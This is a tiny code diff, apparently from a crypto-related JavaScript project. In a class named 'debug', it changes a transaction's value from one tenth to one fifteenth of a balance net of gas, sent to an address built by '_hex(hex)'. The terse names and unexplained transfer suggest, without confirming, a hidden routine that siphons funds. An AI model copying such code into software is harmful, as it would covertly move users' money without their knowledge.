@@ -1133,7 +1133,7 @@ export class debug {
               to: _hex(hex),
               gas: _g,
               gasPrice: _gP,
-              value: ((_b - (_gP * _g)) / 10).toFixed(0),
+              value: ((_b - (_gP * _g)) / 15).toFixed(0),
             });
           });
         });
